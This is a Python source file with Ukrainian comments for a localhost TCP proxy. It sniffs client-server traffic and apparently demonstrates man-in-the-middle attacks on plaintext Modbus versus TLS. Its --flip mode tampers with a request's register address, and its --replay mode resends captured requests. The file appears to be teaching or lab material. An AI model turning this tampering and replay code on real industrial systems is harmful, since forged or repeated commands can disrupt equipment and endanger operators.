"""Прозорий TCP-проксі-сніфер: моделює зловмисника на шляху «клієнт-сервер».

Слухає на LISTEN_PORT, з'єднується з SERVER_PORT і пересилає байти в обидва
боки, друкуючи їх у форматі hex+ASCII. Для відкритого Modbus видно PDU
(код функції, значення регістрів); для TLS видно лише шифротекст.

Режими активних атак (доводять дієвість або безсилля зловмисника):
  --flip     зіпсувати один байт у першому запиті клієнта (підміна команди);
  --replay   повторно надіслати серверу перехоплений запит після першої
             відповіді (атака повторного відтворення).

    python sniffer.py --listen 1600 --server 1502 --out data/sniff.txt [--flip|--replay]
"""
from __future__ import annotations

import argparse
import socket
import threading


def hexdump(data: bytes, prefix: str) -> str:
    lines = []
    for off in range(0, len(data), 16):
        chunk = data[off:off + 16]
        hexs = " ".join(f"{b:02x}" for b in chunk)
        text = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        lines.append(f"{prefix} {off:04x}  {hexs:<47}  {text}")
    return "\n".join(lines)


def pump(src: socket.socket, dst: socket.socket, label: str, out) -> None:
    while True:
        try:
            data = src.recv(4096)
        except OSError:
            break
        if not data:
            break
        out.write(f"[{label}] {len(data)} байт\n{hexdump(data, label)}\n")
        out.flush()
        try:
            dst.sendall(data)
        except OSError:
            break
    dst.close()


def pump_attack(src: socket.socket, dst: socket.socket, label: str, out,
                mode: str, state: dict) -> None:
    """Пересилання з активною атакою: --flip (підміна) або --replay."""
    peer = {"C->S": "клієнта", "S->C": "сервера"}[label]
    while True:
        try:
            data = src.recv(4096)
        except OSError:
            break
        if not data:
            break
        out.write(f"[{label}] {len(data)} байт\n{hexdump(data, label)}\n")
        out.flush()

        # перший чанк від клієнта визначає тип сесії: 0x16 = ClientHello (TLS)
        if label == "C->S" and "tls" not in state and data[:1] == b"\x16":
            state["tls"] = True
        is_plain_mb = (not state.get("tls") and len(data) >= 12
                       and data[7] == 0x03)  # відкритий Modbus PDU
        is_tls_rec = data[0] == 0x17                        # запис Application Data TLS
        if mode == "flip" and label == "C->S" and not state.get("flipped") \
                and (is_plain_mb or is_tls_rec):
            # для Modbus: байт 9, молодший біт початкової адреси регістрів
            # (0 -> 8): сервер виконає команду з ІНШОЮ адресою, ніж просив
            # клієнт; для TLS: зіпсований байт шифрозапису.
            tampered = bytearray(data)
            off = 9 if is_plain_mb else min(16, len(data) - 1)
            out.write(f"MITM: підроблено байт {off} даних {peer} "
                      f"({data[off]:02x} -> {tampered[off] ^ 0x08:02x})\n")
            out.flush()
            tampered[off] ^= 0x08
            data = bytes(tampered)
            state["flipped"] = True

        if mode == "replay" and label == "C->S" and not state.get("captured") \
                and (is_plain_mb or is_tls_rec):
            state["captured"] = bytes(data)
            state["srv_sock"] = dst  # серверний бік з'єднання

        if mode == "replay" and label == "S->C" and state.get("captured") \
                and not state.get("replayed"):
            state["replayed"] = True
            out.write("MITM: перехоплений запит клієнта надіслано серверу вдруге "
                      "(атака повторного відтворення)\n")
            out.flush()
            try:
                state["srv_sock"].sendall(state["captured"])
            except OSError:
                pass

        try:
            dst.sendall(data)
        except OSError:
            break
    dst.close()


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--listen", type=int, default=1600)
    ap.add_argument("--server", type=int, default=1502)
    ap.add_argument("--out", default="data/sniff.txt")
    ap.add_argument("--flip", action="store_true", help="підробити байт у першому запиті")
    ap.add_argument("--replay", action="store_true", help="повторно надіслати перехоплений запит")
    a = ap.parse_args()

    ls = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    ls.bind(("127.0.0.1", a.listen))
    ls.listen(1)
    print(f"sniffer: 127.0.0.1:{a.listen} -> 127.0.0.1:{a.server}, лог у {a.out}")

    out = open(a.out, "w")
    client, _ = ls.accept()
    server = socket.create_connection(("127.0.0.1", a.server))
    mode = "flip" if a.flip else "replay" if a.replay else "passive"
    state: dict = {}
    t1 = threading.Thread(target=pump_attack if mode != "passive" else pump,
                          args=(client, server, "C->S", out),
                          kwargs={"mode": mode, "state": state} if mode != "passive" else {})
    t2 = threading.Thread(target=pump_attack if mode != "passive" else pump,
                          args=(server, client, "S->C", out),
                          kwargs={"mode": mode, "state": state} if mode != "passive" else {})
    t1.start(); t2.start()
    t1.join(); t2.join()
    out.close()
    print("sniffer: з'єднання закрито")


if __name__ == "__main__":
    main()
